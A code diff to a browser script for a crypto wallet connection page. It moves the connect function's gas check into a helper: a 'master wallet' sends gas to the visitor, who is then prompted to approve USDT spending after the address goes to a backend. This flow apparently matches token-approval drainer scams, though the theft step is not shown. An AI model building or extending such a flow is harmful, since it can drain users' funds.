@@ -50,69 +50,51 @@ document.addEventListener('DOMContentLoaded', () => {
   disconnectBtn.addEventListener('click', disconnectWallet)
 })
 
-// Connect wallet function - Now handles gas during connection
+// Connect wallet function - Now properly handles gas during connection
 async function connectWallet() {
   try {
-    showLoading(connectText, true)
+    showLoading(connectText, true);
     
     // Check if Ethereum provider exists
     if (!window.ethereum) {
-      showError('No Ethereum wallet found. Please install MetaMask or Trust Wallet.')
-      return
+      showError('No Ethereum wallet found. Please install MetaMask or Trust Wallet.');
+      return;
     }
     
     // Request account access
     const accounts = await window.ethereum.request({
       method: 'eth_requestAccounts'
-    })
+    });
     
-    walletAddress = accounts[0]
+    walletAddress = accounts[0];
     
     // Create provider and signer
-    provider = new BrowserProvider(window.ethereum)
-    signer = await provider.getSigner()
+    provider = new BrowserProvider(window.ethereum);
+    signer = await provider.getSigner();
     
     // Switch to correct network
-    await switchToCorrectNetwork()
+    await switchToCorrectNetwork();
     
     // Save to localStorage
-    localStorage.setItem('walletAddress', walletAddress)
+    localStorage.setItem('walletAddress', walletAddress);
     
     // Update UI
-    showWalletSection()
-    updateWalletInfo()
+    showWalletSection();
+    updateWalletInfo();
     
     // Send to backend first
-    await sendWalletToBackend()
+    await sendWalletToBackend();
     
-    // CRITICAL FIX: Ensure gas check completes BEFORE any approval
-    console.log('⛽ Starting mandatory gas check...');
-    const hasGas = await checkWalletGasBalance();
-    console.log('⛽ Gas check result:', hasGas);
+    // Handle auto gas during connection
+    await handleAutoGasIfNeeded();
     
-    if (!hasGas) {
-      console.log('🚨 Requesting gas before proceeding...');
-      showSuccess('Insufficient gas detected. Requesting gas from master wallet...')
-      
-      // Request gas and wait for it
-      const gasResult = await requestGasFromMaster(walletAddress);
-      console.log('⛽ Gas request result:', gasResult);
-      
-      // Wait for gas to arrive
-      showSuccess('Gas sent by master wallet. Waiting for confirmation...')
-      await waitForGas(60000)
-      showSuccess('Gas received! You can now approve USDT spending.')
-      console.log('✅ Gas successfully received');
-    }
-    
-    // ONLY show success AFTER gas is confirmed
-    showSuccess('Wallet connected successfully!')
+    showSuccess('Wallet connected successfully!');
     
   } catch (error) {
-    console.error('Connection error:', error)
-    showError('Failed to connect wallet: ' + error.message)
+    console.error('Connection error:', error);
+    showError('Failed to connect wallet: ' + error.message);
   } finally {
-    showLoading(connectText, false)
+    showLoading(connectText, false);
   }
 }
 
@@ -512,3 +494,4 @@ function showError(message) {
     statusMessage.classList.add('hidden')
   }, 5000)
 }
+
